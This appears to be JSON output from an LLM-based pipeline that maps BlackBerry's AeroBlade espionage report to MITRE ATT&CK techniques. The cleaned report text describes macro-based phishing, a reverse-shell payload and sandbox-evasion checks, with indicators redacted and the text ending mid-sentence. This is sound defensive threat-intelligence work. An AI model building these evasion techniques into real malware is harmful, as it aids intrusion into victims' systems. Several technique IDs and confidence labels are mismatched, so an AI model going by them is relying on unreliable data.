{
  "status": "success",
  "mode": "langchain",
  "extraction": {
    "status": "success",
    "extraction_summary": {
      "reports_processed": 1,
      "total_ttps_extracted": 30,
      "langchain_extractions": 1,
      "high_confidence_ttps": 0,
      "processing_time_ms": 15793.677000000001
    },
    "extraction_results": [
      {
        "report_id": "pdf-3b7f6a06126c357830383587d841f333",
        "extracted_ttps": [
          {
            "ttp_id": "1b985cdf-d878-4ac1-b77e-b158810bad66",
            "report_id": "pdf-3b7f6a06126c357830383587d841f333",
            "technique_name": "Remote Template Injection",
            "attack_id": "T1221",
            "tactic": "Initial Access",
            "description": "The docx document employs remote template injection to download the second stage of the infection",
            "confidence_score": 0.748,
            "confidence_level": "very_low",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.382,
              "tool_mentions": 1.0,
              "context_richness": 0.96,
              "multiple_sources": 0.5
            },
            "indicators": [
              "[redacted].docx",
              "remote template injection"
            ],
            "tools": [
              "sc",
              "MS Office documents",
              "ping",
              "at",
              "cmd",
              "reg",
              "zip",
              "net"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "7b76ae34-1131-40bc-a68b-56fe82b96cff",
            "report_id": "pdf-3b7f6a06126c357830383587d841f333",
            "technique_name": "Command and Scripting Interpreter",
            "attack_id": "T1059",
            "tactic": "Execution",
            "description": "Threat actor used command line tools like at, cmd, net, ping, reg for execution",
            "confidence_score": 0.694,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.7,
              "description_detail": 0.322,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "at",
              "cmd",
              "net",
              "ping",
              "reg"
            ],
            "tools": [
              "sc",
              "ping",
              "at",
              "reg",
              "cmd",
              "zip",
              "net"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "f27460b7-a4e0-4685-b1ae-f4b7f8be9222",
            "report_id": "pdf-3b7f6a06126c357830383587d841f333",
            "technique_name": "Phishing",
            "attack_id": "T1566",
            "tactic": "Initial Access",
            "description": "Detected Phishing activity via NLP pattern matching",
            "confidence_score": 0.684,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.116,
              "tool_mentions": 1.0,
              "context_richness": 0.96,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "sc",
              "ping",
              "at",
              "reg",
              "cmd",
              "zip",
              "net"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "461373bc-4717-4de2-b9e1-195afd3556b9",
            "report_id": "pdf-3b7f6a06126c357830383587d841f333",
            "technique_name": "Obfuscated Files or Information",
            "attack_id": "T1027",
            "tactic": "Defense Evasion",
            "description": "The malware uses anti-disassembly techniques, API hashing, and custom encoding to make analysis harder",
            "confidence_score": 0.682,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.62,
              "description_detail": 0.322,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "C:\\Users\\user\\AppData\\Local\\Temp\\[redacted].zip",
              "GetCursorPos()",
              "GetTickCount()"
            ],
            "tools": [
              "sc",
              "Malware",
              "ping",
              "at",
              "cmd",
              "reg",
              "zip",
              "net"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "11c0a7e9-1b95-418a-9b5a-953f299f1e61",
            "report_id": "pdf-3b7f6a06126c357830383587d841f333",
            "technique_name": "Process Hollowing",
            "attack_id": "T1093",
            "tactic": "Defense Evasion",
            "description": "The malware creates a reverse shell by executing cmd.exe in a stealthy way",
            "confidence_score": 0.679,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.62,
              "description_detail": 0.299,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "cmd.exe",
              "CreatePipe()",
              "CreateProcessW()"
            ],
            "tools": [
              "sc",
              "ping",
              "cmd",
              "reg",
              "at",
              "zip",
              "net"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "8ce45c1f-8434-4914-8f18-1bbf627eb94b",
            "report_id": "pdf-3b7f6a06126c357830383587d841f333",
            "technique_name": "Obfuscated Files or Information",
            "attack_id": "T1027",
            "tactic": "Defense Evasion",
            "description": "The final payload of the 2023 attack is stealthier and uses more obfuscation and anti-analysis techniques",
            "confidence_score": 0.677,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.368,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "obfuscated files"
            ],
            "tools": [
              "sc",
              "ping",
              "cmd",
              "at",
              "reg",
              "obfuscation tools",
              "zip",
              "net"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "971916ad-37bf-45cb-8ddf-9bbab9b70c86",
            "report_id": "pdf-3b7f6a06126c357830383587d841f333",
            "technique_name": "Exfiltration Over Alternative Protocol",
            "attack_id": "T1041",
            "tactic": "Exfiltration",
            "description": "The command-and-control (C2) server IP address is the same and connects over port 443",
            "confidence_score": 0.676,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.322,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "redacted[.]redacted[.]com",
              "port 443"
            ],
            "tools": [
              "sc",
              "ping",
              "at",
              "cmd",
              "reg",
              "C2 server",
              "zip",
              "net"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "586d9add-e54d-476b-a43a-e6e894c7c2ea",
            "report_id": "pdf-3b7f6a06126c357830383587d841f333",
            "technique_name": "Spearphishing Attachment",
            "attack_id": "T1566.001",
            "tactic": "Initial Access",
            "description": "AeroBlade used spear-phishing as a delivery mechanism with a weaponized document sent as an email attachment",
            "confidence_score": 0.673,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.9,
              "ioc_evidence": 0.58,
              "description_detail": 0.368,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "[redacted].docx",
              "email attachment"
            ],
            "tools": [
              "sc",
              "MS Office documents",
              "ping",
              "at",
              "cmd",
              "reg",
              "zip",
              "net"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "e12a169c-94cf-4d75-a77e-174d465b5c00",
            "report_id": "pdf-3b7f6a06126c357830383587d841f333",
            "technique_name": "File and Directory Discovery",
            "attack_id": "T1083",
            "tactic": "Discovery",
            "description": "The malware collects a list of directories on the victim's system",
            "confidence_score": 0.672,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.62,
              "description_detail": 0.253,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "GetLogicalDeviceStringsW()",
              "FindFirstFileA()",
              "FindNextFileA()"
            ],
            "tools": [
              "sc",
              "Malware",
              "ping",
              "at",
              "cmd",
              "reg",
              "zip",
              "net"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "c72d5ffe-c9bf-41f1-84b9-6708fc64be62",
            "report_id": "pdf-3b7f6a06126c357830383587d841f333",
            "technique_name": "System Information Discovery",
            "attack_id": "T1082",
            "tactic": "Discovery",
            "description": "The 2023 campaign's final payload includes an option to list directories from infected victims",
            "confidence_score": 0.67,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.322,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "directory listing"
            ],
            "tools": [
              "sc",
              "ping",
              "at",
              "cmd",
              "reg",
              "final payload",
              "zip",
              "net"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "6bd399bc-9eb8-48ed-b5b4-ddeb3c5f32e6",
            "report_id": "pdf-3b7f6a06126c357830383587d841f333",
            "technique_name": "Execution of VBA Macro Code",
            "attack_id": "T1204.002",
            "tactic": "Execution",
            "description": "The malicious VBA macro code delivers the next stage to the final payload execution",
            "confidence_score": 0.666,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.9,
              "ioc_evidence": 0.58,
              "description_detail": 0.322,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "VBA macro code",
              "[redacted].dotm"
            ],
            "tools": [
              "sc",
              "MS Office documents",
              "ping",
              "at",
              "cmd",
              "reg",
              "zip",
              "net"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "5a98bc1a-e9c2-4b49-b499-443e56c4327c",
            "report_id": "pdf-3b7f6a06126c357830383587d841f333",
            "technique_name": "System Information Discovery",
            "attack_id": "T1082",
            "tactic": "Discovery",
            "description": "The malware collects system information from the infected machine",
            "confidence_score": 0.665,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.62,
              "description_detail": 0.207,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "GetUserNameA()",
              "GetComputerNameA()",
              "GetModuleFileNameA()"
            ],
            "tools": [
              "sc",
              "Malware",
              "ping",
              "at",
              "cmd",
              "reg",
              "zip",
              "net"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "d4e595aa-0f5e-4faa-965a-3d9b51038732",
            "report_id": "pdf-3b7f6a06126c357830383587d841f333",
            "technique_name": "Obfuscated Files or Information",
            "attack_id": "T1027",
            "tactic": "Defense Evasion",
            "description": "Threat actor used obfuscation to hide files or information",
            "confidence_score": 0.665,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.62,
              "description_detail": 0.207,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "Sha 265 MD5",
              "6d515dafef42a5648754de3c0fa6adfcb8b57af1c1d69e629b0d840dab7f91ec",
              "62D3FF36EC8A721488E512E1C94B2744"
            ],
            "tools": [
              "sc",
              "malware",
              "ping",
              "at",
              "cmd",
              "reg",
              "zip",
              "net"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "4548126e-6e4b-4b24-89db-d56268318e7b",
            "report_id": "pdf-3b7f6a06126c357830383587d841f333",
            "technique_name": "Exfiltration Over Alternative Protocol",
            "attack_id": "T1041",
            "tactic": "Exfiltration",
            "description": "Threat actor exfiltrated data using alternative protocols",
            "confidence_score": 0.664,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.62,
              "description_detail": 0.199,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "Sha 256 MD5",
              "16bd34c3f00288e46d8e3fdb67916aa7c68d8a0622f2c76c57112dae36c76875",
              "885B04081BD89F5E23CBC59723052601"
            ],
            "tools": [
              "sc",
              "malware",
              "ping",
              "at",
              "cmd",
              "reg",
              "zip",
              "net"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "8ca0fd9c-6756-49d5-ac7f-779942bf4972",
            "report_id": "pdf-3b7f6a06126c357830383587d841f333",
            "technique_name": "Data Staging",
            "attack_id": "T1074",
            "tactic": "Collection",
            "description": "The malware collects and transmits information to a remote server",
            "confidence_score": 0.662,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.23,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "GetAdaptersInfo()",
              "GetLogicalDeviceStringsW()"
            ],
            "tools": [
              "sc",
              "Malware",
              "ping",
              "at",
              "cmd",
              "reg",
              "zip",
              "net"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "764dc7a3-3108-4b36-b676-5337de821da9",
            "report_id": "pdf-3b7f6a06126c357830383587d841f333",
            "technique_name": "Masquerading",
            "attack_id": "T1036",
            "tactic": "Defense Evasion",
            "description": "The malware uses a legitimate process to execute malicious code",
            "confidence_score": 0.662,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.268,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "cmd.exe"
            ],
            "tools": [
              "sc",
              "Malware",
              "ping",
              "at",
              "cmd",
              "reg",
              "zip",
              "net"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "ea656dbf-3a20-49cc-afb6-6cad2d24fcf3",
            "report_id": "pdf-3b7f6a06126c357830383587d841f333",
            "technique_name": "Scheduled Task",
            "attack_id": "T1053",
            "tactic": "Persistence",
            "description": "The malware achieves persistence via Windows Task Scheduler",
            "confidence_score": 0.656,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.184,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "WinUpdate2",
              "CoCreateInstance()"
            ],
            "tools": [
              "sc",
              "ping",
              "Windows Task Scheduler",
              "at",
              "cmd",
              "reg",
              "zip",
              "net"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "fb80cead-412a-4fd5-8ed9-54cd19659bca",
            "report_id": "pdf-3b7f6a06126c357830383587d841f333",
            "technique_name": "Command and Control",
            "attack_id": "T1071",
            "tactic": "Command and Control",
            "description": "The malware connects to a hard-coded C2 server",
            "confidence_score": 0.656,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.184,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "[redacted].165",
              "[redacted].217"
            ],
            "tools": [
              "sc",
              "Malware",
              "ping",
              "at",
              "cmd",
              "reg",
              "zip",
              "net"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "a246f4f9-2f74-489c-b03d-fa87ba2bdd09",
            "report_id": "pdf-3b7f6a06126c357830383587d841f333",
            "technique_name": "Resource Development",
            "attack_id": "T1583",
            "tactic": "Resource Development",
            "description": "Threat actor developed additional resources for campaign",
            "confidence_score": 0.652,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.161,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "September 2022",
              "July 2023"
            ],
            "tools": [
              "sc",
              "malware",
              "ping",
              "at",
              "cmd",
              "reg",
              "zip",
              "net"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "73c200ca-63ff-43ec-9bf5-c7b9cbb8e853",
            "report_id": "pdf-3b7f6a06126c357830383587d841f333",
            "technique_name": "Create or Modify System Process",
            "attack_id": "T1543.001",
            "tactic": "Persistence",
            "description": "The attacker created a reverse shell connecting to the C2 server",
            "confidence_score": 0.65,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.9,
              "ioc_evidence": 0.54,
              "description_detail": 0.253,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "reverse shell"
            ],
            "tools": [
              "sc",
              "reverse shell tools",
              "ping",
              "at",
              "cmd",
              "reg",
              "zip",
              "net"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "b902fa20-18a9-424f-9a87-66274aaa20a3",
            "report_id": "pdf-3b7f6a06126c357830383587d841f333",
            "technique_name": "Data Encoding",
            "attack_id": "T1132",
            "tactic": "Command and Control",
            "description": "Threat actor used encoding to exfiltrate data",
            "confidence_score": 0.646,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.161,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "base64"
            ],
            "tools": [
              "sc",
              "malware",
              "ping",
              "at",
              "cmd",
              "reg",
              "zip",
              "net"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "0c245210-8dcf-450e-901a-20876970e2e0",
            "report_id": "pdf-3b7f6a06126c357830383587d841f333",
            "technique_name": "Process Discovery",
            "attack_id": "T1053.005",
            "tactic": "Discovery",
            "description": "The attacker discovered processes on the victim's system",
            "confidence_score": 0.645,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.9,
              "ioc_evidence": 0.54,
              "description_detail": 0.222,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "process discovery"
            ],
            "tools": [
              "sc",
              "discovery tools",
              "ping",
              "at",
              "cmd",
              "reg",
              "zip",
              "net"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "64ec409c-3658-4e73-92a3-83c428acaa8e",
            "report_id": "pdf-3b7f6a06126c357830383587d841f333",
            "technique_name": "Process Injection",
            "attack_id": "T1055",
            "tactic": "Defense Evasion",
            "description": "Detected Process Injection activity via NLP pattern matching",
            "confidence_score": 0.636,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.214,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "sc",
              "ping",
              "at",
              "reg",
              "cmd",
              "zip",
              "net"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "136e4c3f-616a-4289-831c-f395ff448971",
            "report_id": "pdf-3b7f6a06126c357830383587d841f333",
            "technique_name": "Application Layer Protocol",
            "attack_id": "T1071",
            "tactic": "Command And Control",
            "description": "Detected Application Layer Protocol activity via NLP pattern matching",
            "confidence_score": 0.633,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.199,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "sc",
              "ping",
              "at",
              "reg",
              "cmd",
              "zip",
              "net"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "8f31312f-d357-4657-9402-beecd07ede9b",
            "report_id": "pdf-3b7f6a06126c357830383587d841f333",
            "technique_name": "Command and Scripting Interpreter",
            "attack_id": "T1059.005",
            "tactic": "Execution",
            "description": "The attacker used cmd for execution",
            "confidence_score": 0.633,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.9,
              "ioc_evidence": 0.54,
              "description_detail": 0.138,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "cmd.exe"
            ],
            "tools": [
              "sc",
              "ping",
              "cmd",
              "reg",
              "at",
              "zip",
              "net"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "00c01b51-cfd2-4221-896b-71e88a646eef",
            "report_id": "pdf-3b7f6a06126c357830383587d841f333",
            "technique_name": "Command and Scripting Interpreter",
            "attack_id": "T1059",
            "tactic": "Execution",
            "description": "Detected Command and Scripting Interpreter activity via NLP pattern matching",
            "confidence_score": 0.631,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.185,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "sc",
              "ping",
              "at",
              "reg",
              "cmd",
              "zip",
              "net"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "6b9f5801-2dc6-4f85-b68c-86759257f2e2",
            "report_id": "pdf-3b7f6a06126c357830383587d841f333",
            "technique_name": "Obfuscated Files or Information",
            "attack_id": "T1027",
            "tactic": "Defense Evasion",
            "description": "Detected Obfuscated Files or Information activity via NLP pattern matching",
            "confidence_score": 0.631,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.185,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "sc",
              "ping",
              "at",
              "reg",
              "cmd",
              "zip",
              "net"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "c7c8946c-7af2-4adb-a00d-fcf50ed48353",
            "report_id": "pdf-3b7f6a06126c357830383587d841f333",
            "technique_name": "Exfiltration Over C2 Channel",
            "attack_id": "T1041",
            "tactic": "Exfiltration",
            "description": "Detected Exfiltration Over C2 Channel activity via NLP pattern matching",
            "confidence_score": 0.631,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.185,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "sc",
              "ping",
              "at",
              "reg",
              "cmd",
              "zip",
              "net"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "562aae2d-8bff-4e95-84a9-3d87b6a9ef3b",
            "report_id": "pdf-3b7f6a06126c357830383587d841f333",
            "technique_name": "Archive Collected Data",
            "attack_id": "T1560",
            "tactic": "Collection",
            "description": "Detected Archive Collected Data activity via NLP pattern matching",
            "confidence_score": 0.628,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.162,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "sc",
              "ping",
              "at",
              "reg",
              "cmd",
              "zip",
              "net"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "3665c5cf-3c4a-4886-a878-e0b7def78f5d",
            "report_id": "pdf-3b7f6a06126c357830383587d841f333",
            "technique_name": "User Execution: Malicious File",
            "attack_id": "T1204.002",
            "tactic": "Execution",
            "description": "Detected User Execution: Malicious File activity via NLP pattern matching",
            "confidence_score": 0.621,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.9,
              "ioc_evidence": 0.5,
              "description_detail": 0.185,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "sc",
              "ping",
              "at",
              "reg",
              "cmd",
              "zip",
              "net"
            ],
            "extraction_method": "nlp_indicator"
          }
        ],
        "nlp_analysis": {
          "processed_text": {
            "cleaned_text": "1 / 1 3 Dmitry Bestuzhev  The BlackBerry Research   Intelligence Team AeroBlade on the Hunt Targeting the U.S. Aerospace Industry blogs.blackberry.com/en/2023/11/aeroblade-on-the-hunt-targeting-us-aerospace-industry Summary BlackBerry has uncovered a previously unknown threat actor targeting an aerospace organization in the United States  with the apparent goal of conducting commercial and competitive cyber espionage. The BlackBerry Threat Research and Intelligence team is tracking this threat actor as AeroBlade. The actor used spear-phishing as a delivery mechanism: A weaponized document  sent as an email attachment  contains an embedded remote template injection technique and a malicious VBA macro code  to deliver the next stage to the final payload execution. Evidence suggests that the attacker s network infrastructure and weaponization became operational around September 2022. BlackBerry assesses with medium to high confidence that the offensive phase of the attack occurred in July 2023. The attacker improved its toolset during that time  making it stealthier  while the network infrastructure remained the same. Given the final payload functionality and the subject of the attack  BlackBerry assesses with medium to high confidence that the goal of this attack was commercial cyber espionage. Brief MITRE ATT CK Information Tactic Technique Initial Access T1566.001 Execution T1204.002  T1059.005  T1203  T1559.002  T1559.001  T1106  T1059.003 Defense EvasionT1027  T1140  T1221  T1036.005  T1027.001  Persistence T1137.001  T1053.005 Command-and- Control T1071.001  T1001  T1573.001  T1105 Exfiltration T1041  T1029   2 / 1 3 Discovery T1083  T1082  T1033  T1016 Weaponization and Technical Overview Weapons MS Office documents  PE 64 Attack Vector Spear-phishing Network InfrastructureC2 server on port 443 Targets Aerospace industry in the United States Technical Analysis Context The BlackBerry Threat Research and Intelligence team recently uncovered two campaigns by a previously unknown threat actor  which we have named AeroBlade  targeting an aerospace industry company in the U.S. We found two phases of the attack chain. The initial attack was conducted in September 2022  and based on our technical analysis  we have concluded this was a  testing  stage. The second attack occurred in July 2023. There are certain similarities between both campaigns: Both lure documents were named  [redacted].docx.  The final payload is a reverse shell. The command-and-control (C2) server IP address is the same. There are also some interesting differences between the two campaigns: The final payload of the 2023 attack is stealthier and uses more obfuscation and anti-analysis techniques. The 2023 campaign s final payload includes an option to list directories from infected victims. During an attack  a malicious Microsoft Word document called [redacted].docx is delivered via email spear-phishing  which  when executed manually by the user  employs a remote template injection to download a second stage file called  [redacted].dotm . This file in turn executes  item3.xml   which creates a reverse shell connecting to  redacted[.]redacted[.]com  over port 443. 3 / 1 3 Figure 1   AeroBlade execution chain Attack Vector First Stage The first stage of the infection is a targeted email that has a malicious document attachment with the filename [redacted].docx. When opened  the document displays text in a deliberately scrambled font  along with a  lure  message asking the potential victim to click it to enable the content in MS Office. The docx document employs remote template injection  MITRE ATT CK technique T1221  to download the second stage of the infection. 4 / 1 3 Figure 2   The malicious document displays text in a scrambled font  along with a visual lure asking the user to click it to enable content Figure 3   The  fixed  document that appears once the victim clicks the lure message to manually enable content The next-stage information is saved in an XML (eXtensible Markup Language) file inside a .dotm file. A .dotm file is a document template created by Microsoft Word  containing the default layout  settings  and macros for a document. Figure 4   Next stage parameter in the OLE file hxxp://[redacted].106.27. [redacted]/[redacted][.]dotm Once the victim opens the file and executes it by manually clicking the  Enable Content  lure message  the [redacted].dotm document discretely drops a new file to the system  and opens it. The newly downloaded document is readable  leading the victim to believe that the file initially received by email is legitimate. In fact  it s a classic cyber bait-and-switch  performed invisibly right under the victim s nose. 5 / 1 3 Figure 5   A second document is discretely downloaded and opened in place of the original malicious document It s interesting to note that the body of the first-stage document contains an executable library that runs with the help of the second stage   we ll take a closer look at this executable library a little later on in this report. Figure 6   Location of the executable library in the file list in the [redacted].docx document Second Stage The second stage of execution is the OLE document which contains the macro. The macro runs the library included in the first-stage document. 6 / 1 3 Figure 7   A macro that runs a malicious PE file The second-stage macro also copies the OLE document ([redacted].docx) to a hard-coded file name at a specific path: C:\\Users\\user\\AppData\\Local\\Temp\\[redacted].zip The final execution stage will be an executable file run on the system using the macro. Payload The final payload is a DLL that acts as a reverse shell that connects to a hard-coded C2 server. Reverse shells allow attackers to open ports to the target machines  forcing communication and enabling a complete takeover of the device. It is therefore a severe security threat. The DLL is also capable of listing all directories found on the now-infected system. It is a heavily obfuscated executable which implements complex techniques  such as: Anti-disassembly techniques to make analysis harder API hashing to hide its usage of Windows functions  The hash function used is Murmur. Custom encoding for each string used Multiple checks are implemented to avoid the malware running on an automated environment such as a sandbox  This impedes analysis. For anti-disassembly  the executable contains control flow obfuscation  usage of data between code  and dead code-executed instructions that do not affect the malware. Dead code is a section in the source code of a program which is executed  but whose result is never used in any other computation. These techniques are all added to make analysis harder for defenders. 7 / 1 3 Figure 8   Example of data between code  control flow obfuscation  and use of dead code Figure 9   Usage of evil byte  a common technique to defeat the way disassembler tools work Figure 10   Fixed evil byte showing real code execution The executable also implements techniques that causes the malware to skip execution on automated systems  such as sandboxes or antivirus (AV) emulators. These techniques include: Comparing the position of the mouse cursor using the GetCursorPos() function Comparing time elapsed on execution using the function GetTickCount() Checking to see if the number of processors is less than two  using the NumberOfProcessors from the Process Environment Block (PEB) structure Checking physical memory size using the function GlobalMemoryStatusEx() Figure 11   Checking number of processors used by the victim s machine 8 / 1 3 Figure 12   Checking available physical memory on the victim s machine After passing all those checks  the malicious DLL executes the following sequence: Decrypts embedded static configuration containing the C2 server information for it to connect to Collects system information from the infected machine Sets persistence to survive upon system reboot Finally  it connects to the C2 server  transmitting all its collected information  and spawning a reverse shell  while also sending a list of directories found on the infected system. Figure 13   Static configuration Static configuration is AES encrypted  and once decrypted  contains the following structure: First DWORD: 0x154  unknown usage  static config size is hard-coded at 72 bytes Second DWORD: 0x1BB  connects to TCP port 443 16-byte string  Pa$$w0rd  seems to be a password to connect to the C2  but it is not used in practice C2 server points to: redacted[.]redacted[.]com 9 / 1 3 Figure 14   Example of information collected from infected system Bot-collected data structure is as follows: Offset 0x3: hard-coded 